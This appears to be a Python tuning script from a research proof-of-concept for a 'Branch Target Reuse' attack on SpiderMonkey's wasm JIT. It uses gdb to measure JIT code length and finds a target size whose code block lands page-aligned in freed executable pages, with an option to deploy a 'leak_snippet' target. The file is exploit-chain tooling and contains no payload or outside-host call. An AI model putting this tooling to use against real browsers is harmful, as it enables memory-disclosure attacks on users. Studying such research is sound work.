#!/usr/bin/env python3

# Branch Target Reuse (BTR)
# April 30th 2026
# Yuhui Zhu

# Auto-tuner for the x86_64 trampoline/v128 wasm target (stage 2 of the PoC
# flow). It answers: what nr_loads makes the target's JIT codeLength fill a whole
# number of 64 KB executable pages while keeping the literal pool as dense as
# possible?
#
# WHY this matters (see notes + tools/README.md):
#   * The reuse attack frees an N-page run of JS-trainer code and expects the wasm
#     target's Tier-1 code block to land in exactly that hole. So codeLength should
#     round up to N * 0x10000 (N whole 64 KB exec pages), no larger, no smaller.
#   * codeBase must be page-aligned. RandomPaddingForCodeLength offsets codeBase by
#     a random k*0x40 UNLESS codeLength is within one cacheline-pair of the 4 KB
#     boundary above it (rounded-4KB remainder < 0x80 => padLinesAvailable <= 1 =>
#     padding forced to 0). So we want codeLength just below a page multiple with
#     that remainder < 0x80 -- "padding-free".
#   * v128 (16-byte slots) is already the densest encoding; the only free knob is
#     nr_loads (coarse, ~112 B/slot) plus pad_fill_tail (fine, ~a few B/line).
#
# It reuses make_target_wasm.py for codegen (no geometry duplicated) and measures
# codeLength by JITing each candidate under tools/wasm_layout.gdb, parsing its
# [WASM] codeLength line. Requires $JS_CMD (the debug js shell) and gdb.
#
# Usage (from attack-surface/spidermonkey/):
#   JS_CMD=/path/to/js python tools/tune_target.py            # defaults: 2 pages, 1 func
#   JS_CMD=/path/to/js python tools/tune_target.py --deploy   # ... and write wasm/
#
# Sanity check: --pages 8 --nr-func 7 rediscovers nr_loads=2448, codeLength=0x7ffa2
# -- the hand-tuned committed geometry.

import argparse
import os
import re
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)
import make_target_wasm as mtw

EXEC_PAGE = 0x10000          # ExecutableCodePageSize (64 KB)
PAGE_4K = 0x1000             # RandomPaddingForCodeLength rounds to this
PAD_FREE_WINDOW = 0x80       # rounded-4KB remainder below this => padding forced 0

# wasm_layout.gdb needs a landing-grid stride; we only read [WASM] codeLength, so
# any 16-aligned value works.
DUMMY_GRID = "0x600"
WASM_RE = re.compile(r"\[WASM\]\s+codeBase=\S+\s+codeLength=(0x[0-9a-fA-F]+)")


def js_cmd():
    js = os.environ.get("JS_CMD")
    if not js or not os.access(js, os.X_OK):
        sys.exit(f"error: $JS_CMD not set/executable: {js!r}")
    return js


class Measurer:
    """Builds a candidate target and returns its JITed codeLength, caching by
    (nr_loads, pad_fill_tail) so the search never re-probes a point."""

    def __init__(self, tmpdir, arch, nr_func):
        self.tmp = tmpdir
        self.arch = arch
        self.nr_func = nr_func
        self.js = js_cmd()
        self.cache = {}
        self.probes = 0

    def _build(self, nr_loads, pad_fill_tail):
        cfg = mtw.Config(arch=self.arch, encoding="v128", layout="trampoline",
                         nr_loads=nr_loads, pad_fill_tail=pad_fill_tail,
                         nr_func=self.nr_func,
                         out_dir=self.tmp, name="tune_candidate")
        mtw.generate(cfg)
        mtw.compile_wasm(cfg)
        return cfg

    def _probe_codelen(self, wasm_path):
        """Run wasm_layout.gdb and parse the [WASM] codeLength line."""
        cmd = ["gdb", "-nx", "-q", "-batch",
               "-ex", "set auto-load safe-path /",
               "-ex", f"set $grid={DUMMY_GRID}",
               "-ex", f'set $arch="{self.arch}"',
               "-ex", 'set $nslot=0',           # suppress the [POOL] pass we don't need
               "-x", "wasm_layout.gdb",
               "--args", self.js, "probe_load.js", os.path.abspath(wasm_path)]
        r = subprocess.run(cmd, cwd=HERE, capture_output=True, text=True)
        for line in r.stdout.splitlines():
            m = WASM_RE.search(line)
            if m:
                return int(m.group(1), 16)
        raise RuntimeError(
            "no [WASM] codeLength line from gdb probe; stderr:\n" + r.stderr[-2000:])

    def measure(self, nr_loads, pad_fill_tail=0):
        key = (nr_loads, pad_fill_tail)
        if key not in self.cache:
            cfg = self._build(nr_loads, pad_fill_tail)
            self.probes += 1
            length = self._probe_codelen(cfg.wasm_path)
            self.cache[key] = length
            print(f"  probe nr_loads={nr_loads} pad_fill_tail={pad_fill_tail} "
                  f"-> codeLength=0x{length:x}", file=sys.stderr)
        return self.cache[key]


def largest_under(measurer, n_pred, boundary):
    """Largest nr_loads whose codeLength <= boundary, starting from the affine
    prediction n_pred and walking to the exact edge."""
    n = max(1, n_pred)
    # Walk down while over the boundary.
    while n > 1 and measurer.measure(n) > boundary:
        n -= 1
    # Walk up while the next one still fits.
    while measurer.measure(n + 1) <= boundary:
        n += 1
    return n


def fine_tune_padding(measurer, nr_loads, boundary):
    """If nr_loads alone leaves a rounded-4KB remainder >= 0x80 (codeBase would
    get a random offset), add pad_fill_tail lines to nudge codeLength up into the
    padding-free window [boundary-0x80, boundary). Returns (pad_fill_tail, length)
    for the best padding-free point found, else the pad_fill_tail=0 point."""
    base_len = measurer.measure(nr_loads, 0)
    if pad_free_rem(base_len) < PAD_FREE_WINDOW:
        return 0, base_len
    # Measure the per-line delta from one extra padding line.
    step = measurer.measure(nr_loads, 1) - base_len
    if step <= 0:
        return 0, base_len
    best = (0, base_len)
    for p in range(1, 64):
        length = measurer.measure(nr_loads, p)
        if length > boundary:
            break
        if pad_free_rem(length) < PAD_FREE_WINDOW:
            best = (p, length)
            break
    return best


def pad_free_rem(codelength):
    """Bytes from codeLength up to the next 4 KB boundary."""
    return (-codelength) % PAGE_4K


def density(nr_func, nr_loads, slot_size, codelength):
    return nr_func * nr_loads * slot_size / codelength


def tune(pages, deploy, arch, nr_func):
    boundary = pages * EXEC_PAGE
    slot_size = mtw.ENCODINGS["v128"].slot_size
    if nr_func is None:
        nr_func = mtw.DEFAULT_TUNING[(arch, "trampoline", "v128")]["nr_func"]
    print(f"[tune] target: fill {pages} exec pages "
          f"(codeLength <= 0x{boundary:x}), {arch}/v128/trampoline, {nr_func} funcs",
          file=sys.stderr)

    with tempfile.TemporaryDirectory() as tmp:
        m = Measurer(tmp, arch, nr_func)

        # Two seeds low enough to stay under the boundary, then fit the affine
        # codeLength(nr_loads) and predict.
        s1 = max(8, boundary // 300)
        s2 = s1 + 128
        l1, l2 = m.measure(s1), m.measure(s2)
        slope = (l2 - l1) / (s2 - s1)
        intercept = l1 - slope * s1
        n_pred = int((boundary - intercept) / slope)
        print(f"[tune] affine fit: ~{slope:.1f} B/slot, intercept 0x{int(intercept):x}"
              f" -> predicted nr_loads={n_pred}", file=sys.stderr)

        nr_loads = largest_under(m, n_pred, boundary)
        pad_fill_tail, length = fine_tune_padding(m, nr_loads, boundary)
        rem = pad_free_rem(length)
        padding_free = rem < PAD_FREE_WINDOW
        dens = density(nr_func, nr_loads, slot_size, length)

        print(f"[tune] {m.probes} probes", file=sys.stderr)
        print("=" * 60)
        print(f"pages requested     : {pages}  (boundary 0x{boundary:x})")
        print(f"nr_loads            : {nr_loads}")
        print(f"pad_fill_tail       : {pad_fill_tail}")
        print(f"codeLength          : 0x{length:x}  ({length} bytes)")
        print(f"pages used          : {(length + EXEC_PAGE - 1) // EXEC_PAGE}")
        print(f"rem to 4KB boundary : 0x{rem:x}  "
              f"({'padding-free, codeBase page-aligned' if padding_free else 'NOT padding-free'})")
        print(f"pool density        : {dens:.1%}  "
              f"({nr_func}*{nr_loads}*{slot_size}B pool / codeLength)")
        print("=" * 60)

        ok = length <= boundary and padding_free
        if deploy:
            cfg = mtw.Config(arch=arch, encoding="v128", layout="trampoline",
                             nr_loads=nr_loads, pad_fill_tail=pad_fill_tail,
                             nr_func=nr_func, out_dir="wasm")
            mtw.generate(cfg)
            mtw.compile_wasm(cfg)
            mtw.write_sidecar(cfg)
            print(f"[deploy] wrote {cfg.wasm_path} (+ .wat/.sidecar.json)",
                  file=sys.stderr)
        return ok


def main():
    ap = argparse.ArgumentParser(
        description="Auto-tune nr_loads for a page-aligned, max-density "
                    "trampoline/v128 wasm target.")
    ap.add_argument("--arch", choices=list(mtw.ARCHES), default="x86_64",
                    help="target ISA for the gadget/branch (default: x86_64)")
    ap.add_argument("--nr-func", type=int, default=1,
                    help="number of functions (default: 1)")
    ap.add_argument("--pages", type=int, default=2,
                    help="number of 64 KB exec pages to fill (default: 2 = 0x20000)")
    ap.add_argument("--deploy", action="store_true",
                    help="write the tuned target to wasm/leak_snippet_<arch>_v128.*")
    a = ap.parse_args()
    if a.pages < 1:
        ap.error("--pages must be >= 1")
    if a.nr_func is not None and a.nr_func < 1:
        ap.error("--nr-func must be >= 1")
    ok = tune(a.pages, a.deploy, a.arch, a.nr_func)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
